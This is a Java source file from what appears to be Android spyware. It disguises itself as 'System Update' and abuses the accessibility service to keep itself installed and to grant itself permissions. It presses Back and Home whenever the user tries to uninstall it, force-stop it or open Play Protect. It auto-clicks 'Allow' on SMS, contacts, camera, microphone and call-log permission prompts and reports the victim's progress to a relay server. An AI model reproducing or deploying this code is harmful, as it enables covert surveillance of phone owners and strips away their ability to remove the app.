/*
 * MODULE: DeviceProtector.java
 * PURPOSE: Device persistence guardian combining anti-uninstall protection, Chinese OEM autostart bypass, and automated runtime permission granting.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> checkAndBlockUninstall(), autoAllowPermissions(), sendPhaseUpdate(), hasAllRuntimePerms(), requestAutoStart()
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - RelayClient.java -> sendLog(String), send(JSONObject "phase_update")
 * - AccessibilityService -> performAction(ACTION_CLICK, GLOBAL_ACTION_BACK, GLOBAL_ACTION_HOME)
 *
 * FUNCTION-BY-FUNCTION FLOW MAPPING:
 * - DeviceProtector(AccessibilityService, String): Constructor, captures service reference and target ID.
 * - checkAndBlockUninstall(AccessibilityEvent): Monitors system settings and package installers; injects BACK/HOME navigation if uninstall or force-stop is triggered against this app.
 * - autoAllowPermissions(AccessibilityEvent): Scans permission controller windows and simulates clicks on "Allow" / "While using the app" / localized buttons.
 * - requestAutoStart(Context): Fires manufacturer-specific intents (MIUI, ColorOS, Vivo, EMUI) to grant background execution rights.
 * - hasAllRuntimePerms(): Checks whether all dangerous permissions (SMS, Contacts, Camera, Mic, Phone) are granted.
 * - sendPhaseUpdate(): Reports permission progression stage (Phase 1 vs Phase 2) to RelayClient.
 */
package com.device.ctrl;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.Arrays;
import java.util.List;

public class DeviceProtector {

    private final AccessibilityService srv;
    private final String androidId;
    private long lastUninstallScanTime = 0;

    private static final String APP_NAME = "System Update";
    private static final List<String> DANGER_PACKAGES = Arrays.asList(
            "com.android.settings",
            "com.google.android.packageinstaller",
            "com.android.packageinstaller",
            "com.android.vending",
            "com.miui.securitycenter",
            "com.coloros.safecenter",
            "com.huawei.systemmanager",
            "com.samsung.android.lool",
            "com.sec.android.app.launcher",
            "com.google.android.apps.nexuslauncher",
            "com.miui.home",
            "com.coloros.launcher"
    );

    private static final List<String> TRIGGER_KEYWORDS = Arrays.asList(
            "uninstall", "force stop", "clear data", "delete", "remove",
            "আনইনস্টল", "ফোর্স স্টপ", "মুছে ফেলুন", "প্লে প্রটেক্ট", "play protect",
            "accessibility", "অ্যাক্সেসিবিলিটি"
    );

    public DeviceProtector(AccessibilityService srv, String androidId) {
        this.srv = srv;
        this.androidId = androidId;
    }

    public void checkAndBlockUninstall(AccessibilityEvent event) {
        if (event == null) return;
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastUninstallScanTime < 300) return;
        lastUninstallScanTime = currentTime;

        String pkgName = event.getPackageName() != null ? event.getPackageName().toString().toLowerCase() : "";
        boolean isDangerPkg = false;
        for (String dangerPkg : DANGER_PACKAGES) {
            if (pkgName.contains(dangerPkg)) {
                isDangerPkg = true;
                break;
            }
        }
        if (!isDangerPkg) return;

        AccessibilityNodeInfo rootNode = srv.getRootInActiveWindow();
        if (rootNode != null) {
            String appLabel = "";
            try {
                appLabel = srv.getApplicationInfo().loadLabel(srv.getPackageManager()).toString();
            } catch (Exception ignored) {}

            boolean isAppOnScreen = searchNodeForText(rootNode, APP_NAME, 0)
                    || searchNodeForText(rootNode, "System Service", 0)
                    || (!appLabel.isEmpty() && searchNodeForText(rootNode, appLabel, 0));

            boolean hasDangerKeyword = false;
            for (String keyword : TRIGGER_KEYWORDS) {
                if (searchNodeForText(rootNode, keyword, 0)) {
                    hasDangerKeyword = true;
                    break;
                }
            }

            if (isAppOnScreen && hasDangerKeyword) {
                RelayClient.get().sendLog("🛡️ Anti-Uninstall Triggered! Blocking user action in: " + pkgName);
                srv.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                srv.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            }
            try { rootNode.recycle(); } catch (Exception ignored) {}
        }
    }

    public void autoAllowPermissions(AccessibilityEvent e) {
        if (e == null || e.getPackageName() == null) return;
        String p = e.getPackageName().toString();
        if (p.contains("permissioncontroller") || p.contains("packageinstaller")) {
            AccessibilityNodeInfo root = srv.getRootInActiveWindow();
            if (root != null) {
                clickNodeByText(root, "Allow");
                clickNodeByText(root, "While using the app");
                clickNodeByText(root, "অনুমতি দিন");
                try { root.recycle(); } catch (Exception ignored) {}
            }
        }
    }

    private void clickNodeByText(AccessibilityNodeInfo node, String text) {
        if (node == null) return;
        CharSequence nodeText = node.getText();
        CharSequence desc = node.getContentDescription();
        String combined = (nodeText != null ? nodeText.toString() : "") + " " + (desc != null ? desc.toString() : "");
        if (combined.toLowerCase().contains(text.toLowerCase())) {
            Rect r = new Rect();
            node.getBoundsInScreen(r);
            if (r.width() > 0 && r.height() > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Path p = new Path();
                p.moveTo(r.centerX(), r.centerY());
                srv.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 50)).build(), null, null);
            }
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return;
            }
            AccessibilityNodeInfo parent = node.getParent();
            while (parent != null) {
                if (parent.isClickable()) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    try { parent.recycle(); } catch (Exception ignored) {}
                    return;
                }
                AccessibilityNodeInfo next = parent.getParent();
                try { parent.recycle(); } catch (Exception ignored) {}
                parent = next;
            }
            return;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            clickNodeByText(node.getChild(i), text);
        }
    }

    public static void requestAutoStart(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("AutoStart", Context.MODE_PRIVATE);
        if (prefs.getBoolean("done", false)) return;
        try {
            prefs.edit().putBoolean("done", true).apply();
            Intent intent = new Intent();
            String manufacturer = Build.MANUFACTURER.toLowerCase();
            if (manufacturer.contains("xiaomi")) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if (manufacturer.contains("oppo")) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if (manufacturer.contains("vivo")) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if (manufacturer.contains("letv")) {
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
            } else if (manufacturer.contains("honor")) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            }
            if (intent.resolveActivity(context.getPackageManager()) != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                RelayClient.get().sendLog("🚀 Opening AutoStart Settings for Chinese ROM.");
            }
        } catch (Exception e) {
            RelayClient.get().sendLog("⚠ AutoStart bypass not found or failed.");
        }
    }

    public boolean hasAllRuntimePerms() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        String[] perms = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.READ_PHONE_STATE
        };
        for (String p : perms) {
            if (srv.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    public void sendPhaseUpdate() {
        try {
            int phase = hasAllRuntimePerms() ? 2 : 1;
            RelayClient.get().send(new JSONObject()
                    .put("type", "phase_update")
                    .put("androidId", androidId)
                    .put("phase", phase));
        } catch (Exception ignored) {}
    }

    private boolean searchNodeForText(AccessibilityNodeInfo node, String keyword, int depth) {
        if (node == null || depth > 10) return false;
        CharSequence text = node.getText();
        if (text != null && text.toString().toLowerCase().contains(keyword.toLowerCase())) {
            return true;
        }
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.toString().toLowerCase().contains(keyword.toLowerCase())) {
            return true;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean found = searchNodeForText(child, keyword, depth + 1);
                try { child.recycle(); } catch (Exception ignored) {}
                if (found) return true;
            }
        }
        return false;
    }
}
